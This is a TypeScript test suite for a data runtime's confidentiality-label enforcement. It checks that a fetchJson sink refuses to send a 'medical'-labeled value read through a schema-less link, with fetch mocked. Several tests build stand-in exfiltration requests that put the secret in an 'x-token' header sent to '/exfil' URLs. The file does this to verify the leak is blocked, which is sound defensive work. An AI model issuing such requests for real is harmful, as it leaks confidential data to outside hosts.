import { afterEach, beforeEach, describe, it } from "@std/testing/bdd";
import { expect } from "@std/expect";
import { Identity } from "@commonfabric/identity";
import { internSchema } from "@commonfabric/data-model-schema";
import { StorageManager } from "../src/storage/cache.deno.ts";
import { isCfcEnforcementRejection } from "../src/storage/rejection.ts";
import { Runtime } from "../src/runtime.ts";
import { createTrustedBuilder } from "./support/trusted-builder.ts";
import { setPatternEnvironment } from "../src/env.ts";
import { enqueueSinkRequestPostCommitEffect } from "../src/cfc/sink-request.ts";
import { createFrozenRequestSnapshot } from "../src/cfc/request-snapshot.ts";
import type { JSONSchema } from "../src/builder/types.ts";
import { seedStoredEnvelope } from "./cfc-seed-envelope.ts";

const signer = await Identity.fromPassphrase("runner-cfc-sink-ceiling-link");
const space = signer.did();

// Audit item 21 follow-up (link-read bypass): the per-sink confidentiality
// ceiling only runs for CFC-relevant transactions, and a labeled value pulled
// through a schema-less link marks nothing — the consuming read schema carries
// no ifc and the top-level read target has no stored metadata, so the
// relevance gate in schema.ts never fires for the nested link target. The
// request then egresses unchecked. These tests pin the leak shut at both the
// handler level (the exact read fetchJson's input materialization performs)
// and end-to-end through a real fetchJson pattern.
const CONFIDENTIAL_SCHEMA = internSchema(
  {
    type: "object",
    properties: {
      secret: { type: "string", ifc: { confidentiality: ["medical"] } },
    },
    required: ["secret"],
  } satisfies JSONSchema,
  true,
);

const seedConfidentialCell = async (
  runtime: Runtime,
  id: string,
): Promise<void> => {
  const seed = runtime.edit();
  const target = runtime.getCell(space, id, undefined, seed);
  const targetId = target.getAsNormalizedFullLink().id;
  seedStoredEnvelope(seed, {
    space,
    scope: "space",
    id: targetId,
    path: [],
  }, {
    value: { secret: "rosebud" },
    cfc: {
      version: 1,
      schemaHash: CONFIDENTIAL_SCHEMA.taggedHashString,
      labelMap: {
        version: 1,
        entries: [{
          path: ["secret"],
          label: { confidentiality: ["medical"] },
        }],
      },
    },
  });
  seed.writeOrThrow({
    space,
    scope: "space",
    id: `cid:${CONFIDENTIAL_SCHEMA.taggedHashString}`,
    path: [],
  }, { value: CONFIDENTIAL_SCHEMA.schema });
  expect((await seed.commit()).ok).toBeDefined();
};

describe("CFC sink ceiling on values pulled through schema-less links", () => {
  let storageManager: ReturnType<typeof StorageManager.emulate>;
  let runtime: Runtime;
  let originalFetch: typeof globalThis.fetch;
  let fetchCalls: Array<{ url: string; init?: RequestInit }>;

  beforeEach(() => {
    storageManager = StorageManager.emulate({ as: signer });
    runtime = new Runtime({
      apiUrl: new URL(import.meta.url),
      storageManager,
      cfcSinkMaxConfidentiality: { fetchJson: [] },
    });

    fetchCalls = [];
    originalFetch = globalThis.fetch;
    globalThis.fetch = ((
      input: string | URL | Request,
      init?: RequestInit,
    ) => {
      const url = typeof input === "string"
        ? input
        : input instanceof URL
        ? input.toString()
        : input.url;
      fetchCalls.push({ url, init });
      return Promise.resolve(
        new Response(JSON.stringify({ mocked: true }), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }),
      );
    }) as typeof globalThis.fetch;
  });

  afterEach(async () => {
    globalThis.fetch = originalFetch;
    await runtime?.dispose();
    await storageManager?.close();
  });

  it("gates a sink request built from a labeled value read without the ifc gate (handler-level)", async () => {
    await seedConfidentialCell(runtime, "raw-read-secret");

    const tx = runtime.edit();
    const secret = runtime.getCell(space, "raw-read-secret", undefined, tx);
    // getRaw() resolves links on the way to the target and journals a real
    // consumed read of the labeled field, but does NOT route through
    // validateAndTransform's ifc gate — so nothing marks the transaction
    // CFC-relevant. This is exactly the position fetchJson is in when its
    // request-recording pass reads the already-resolved input value: the
    // confidentiality is materialized into the request, yet the read alone
    // leaves the transaction un-marked.
    const token = secret.key("secret").getRaw() as string;
    expect(token).toBe("rosebud");
    // Precondition that makes this a faithful reproduction (not the direct-gate
    // path already covered by cfc-sink-ceiling.test.ts): the read left the
    // transaction non-relevant, so only the sink-request relevance trigger can
    // pull it into prepareCfc.
    expect(tx.getCfcState().relevant).toBe(false);

    let released = false;
    enqueueSinkRequestPostCommitEffect(
      tx,
      "fetchJson",
      "fetchJson:raw-read",
      createFrozenRequestSnapshot({
        url: "https://example.com/exfil",
        options: { headers: { "x-token": token } },
      }),
      "fetchJson-start",
      () => {
        released = true;
      },
    );
    runtime.prepareTxForCommit(tx);
    const result = await tx.commit();

    expect(released).toBe(false);
    expect(isCfcEnforcementRejection(result.error)).toBe(true);
    expect(String((result.error as Error).message)).toContain(
      "exceeds ceiling for fetchJson",
    );
  });

  it("emits the ceiling diagnostic for the same flow in observe mode", async () => {
    // observe mode must still SEE the violation (the whole point of the
    // relevance fix): without it the tx stays non-relevant and prepareCfc
    // never runs, so observe would emit nothing and a deployment couldn't tell
    // a link-laundered egress from a clean one. It commits (observe never
    // rejects) but records the offending (sink, atom).
    const observeStorage = StorageManager.emulate({ as: signer });
    const observeRuntime = new Runtime({
      apiUrl: new URL(import.meta.url),
      storageManager: observeStorage,
      // The rung under test: the commit below succeeds and the ceiling
      // violation arrives as a diagnostic.
      cfcEnforcementMode: "observe",
      cfcSinkMaxConfidentiality: { fetchJson: [] },
    });
    try {
      await seedConfidentialCell(observeRuntime, "observe-raw-read");
      const tx = observeRuntime.edit();
      const secret = observeRuntime.getCell(
        space,
        "observe-raw-read",
        undefined,
        tx,
      );
      const token = secret.key("secret").getRaw() as string;
      expect(token).toBe("rosebud");
      expect(tx.getCfcState().relevant).toBe(false);

      enqueueSinkRequestPostCommitEffect(
        tx,
        "fetchJson",
        "fetchJson:observe-raw-read",
        createFrozenRequestSnapshot({
          url: "https://example.com/exfil",
          options: { headers: { "x-token": token } },
        }),
        "fetchJson-start",
        () => {},
      );
      observeRuntime.prepareTxForCommit(tx);
      const result = await tx.commit();

      expect(result.ok).toBeDefined();
      expect(
        tx.getCfcState().diagnostics.some((d) =>
          d.includes("exceeds ceiling for fetchJson") && d.includes("medical")
        ),
      ).toBe(true);
    } finally {
      await observeRuntime.dispose();
      await observeStorage.close();
    }
  });

  it("fails closed on a direct commit() when the gated read and request are added after an early prepare", async () => {
    // Codex P2 on #4070: a transaction prepared early (here on empty content,
    // status `prepared`, relevant=false) then handed a schema-less confidential
    // read and a gated sink-request has those additions flip `prepare` to
    // `invalidated` while `relevant` stays false. A caller that commits through
    // the ExtendedStorageTransaction.commit() chokepoint DIRECTLY (no
    // prepareTxForCommit) must still mark relevance in the `invalidated` state,
    // or the enforcement reject is skipped and the request flushes fail-open.
    // This exercises commit()'s own probe — note there is no prepareTxForCommit
    // call below, unlike the other cases.
    await seedConfidentialCell(runtime, "late-add-secret");

    const tx = runtime.edit();
    // Prepare early, before any confidential read or sink request exists.
    tx.prepareCfc();
    expect(tx.getCfcState().prepare.status).toBe("prepared");

    const secret = runtime.getCell(space, "late-add-secret", undefined, tx);
    const token = secret.key("secret").getRaw() as string;
    expect(token).toBe("rosebud");
    // The post-prepare read/record path invalidated the digest but left the
    // transaction non-relevant (the read bypassed the ifc gate).
    expect(tx.getCfcState().relevant).toBe(false);

    let released = false;
    enqueueSinkRequestPostCommitEffect(
      tx,
      "fetchJson",
      "fetchJson:late-add",
      createFrozenRequestSnapshot({
        url: "https://example.com/exfil",
        options: { headers: { "x-token": token } },
      }),
      "fetchJson-start",
      () => {
        released = true;
      },
    );
    expect(tx.getCfcState().prepare.status).toBe("invalidated");

    // Direct commit() — the chokepoint Codex's finding is about.
    const result = await tx.commit();

    expect(released).toBe(false);
    // Assert it is specifically the CFC enforcement rejection, not some other
    // commit error — otherwise an unrelated failure would let this regression
    // guard pass vacuously (cubic review). The invalidated relevant tx is
    // rejected for being not-prepared, and the reason names the post-prepare
    // read that invalidated the digest.
    expect(isCfcEnforcementRejection(result.error)).toBe(true);
    expect(result.error?.message).toContain("read-after-prepare");
  });

  it("never fires a fetchJson pattern request carrying a labeled header (end-to-end)", async () => {
    setPatternEnvironment({
      apiUrl: new URL("http://mock-test-server.local"),
    });
    await seedConfidentialCell(runtime, "pattern-secret");

    const { commonfabric } = createTrustedBuilder(runtime);
    const { pattern, byRef } = commonfabric;
    const fetchJson = byRef("fetchJson");
    const testPattern = pattern<{ url: string; token: string }>(
      ({ url, token }) =>
        fetchJson({
          url,
          options: { headers: { "x-token": token } },
        }),
    );

    const tx = runtime.edit();
    const secret = runtime.getCell(space, "pattern-secret", undefined, tx);
    const resultCell = runtime.getCell(
      space,
      "pattern-fetch-result",
      undefined,
      tx,
    );
    const result = runtime.run(
      tx,
      testPattern,
      {
        url: "http://mock-test-server.local/exfil",
        token: secret.key("secret"),
      } as unknown as { url: string; token: string },
      resultCell,
    );
    runtime.prepareTxForCommit(tx);
    await tx.commit();

    await runtime.idle();
    // The fetch (if any) fires from a post-commit effect and writes its result
    // via separate transactions — give those a chance to run, then settle.
    await result.pull();
    await runtime.idle();

    // The ceiling for fetchJson is empty: a request whose headers carry a
    // value labeled ["medical"] must never reach the network.
    expect(
      fetchCalls.map((call) => call.init?.headers ?? null),
    ).toEqual([]);
  });
});
